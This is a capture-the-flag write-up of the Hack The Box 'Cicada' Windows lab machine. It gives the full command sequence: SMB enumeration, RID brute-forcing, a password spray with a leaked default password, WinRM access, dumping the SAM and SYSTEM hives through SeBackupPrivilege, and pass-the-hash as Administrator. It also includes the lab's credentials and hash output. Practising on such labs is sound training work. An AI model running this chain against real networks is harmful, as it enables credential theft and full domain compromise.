---
title: Cicada
date: 2024-12-25
draft: false
tags:
  - htb
  - easy
  - windows
category: Write-up
description: Cicada is an easy-difficult Windows machine centered around beginner Active Directory enumeration and exploitation. Players enumerate the domain, identify users, move through shares, uncover plaintext passwords hidden in files, execute a password spray, and abuse SeBackupPrivilege to fully compromise the system. Smooth ride… until Windows decides to act like Windows.
---

# Initial Recon

```bash
80 - http
445 - smb
```

### SMB Recon

```bash
smbclient \\10.10.10.10\ -L
```

```bash
 Sharename       Type      Comment
 ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  DEV             Disk      
  HR              Disk      
  IPC$            IPC       Remote IPC
  NETLOGON        Disk      Logon server share 
  SYSVOL          Disk      Logon server share 
 from HR share we got a file 
 Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

### NetExec

It runs as a guest user over SMB. Cute mistake.

```bash
nxc smb 10.10.10.10 -u '' --rid-brute
```

```bash
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson(SidTypeUser)  → default password for this we used just creds.txt files on netexec 
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser) -- users with the creds 
```

**Findings:**

```bash
nxc smb 10.10.10.10 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

```bash
 445    CICADA-DC        david.orelious 2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
```

List the `--shares` using `netexec` or `smbmap` using david's credentials.

---

```bash
nxc smb target -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```

Download the output of the shares without using `smbclient`. Work smarter, less terminal gymnastics.

---

# User Flag

Checked the `DEV` share using `smbclient`, which is **readable** by the **david** user, and found a file containing:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

```bash
nxc winrm 10.10.10.10 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

### Evil-WinRM

```bash
evil-winrm -i 10.10.10.10 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

# Root

Using the credentials to gain a shell through `evil-winrm`, we identified the following privilege:

```bash
SeBackupPrivilege
```

This privilege allows backing up folders without requiring administrator permissions. Because apparently Windows thought that was a fantastic idea.

→ Backup `sam` and `system` from the registry using:

```bash
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

→ Download `sam`  
→ Download `system`

---

`Alternative`

```bash
nxc smb 10.10.10.10 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -M backup_operator
```

This can also extract data directly from the registry.

`Alternative`

This method can extract data from the registry as well:

```bash
impacket-secretsdump
```

---

```bash
pypykatz registry --sam sam system
```

→ `pypykatz` is the Python implementation of `mimikatz`, used for extracting passwords from the registry.

---

> About the NTLM hash  
> https://www.thehacker.recipes/ad/movement/ntlm/

---

```bash
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```bash
evil-winrm -i <ip> -u Administrator -H <hash>
```

Gained `Root`

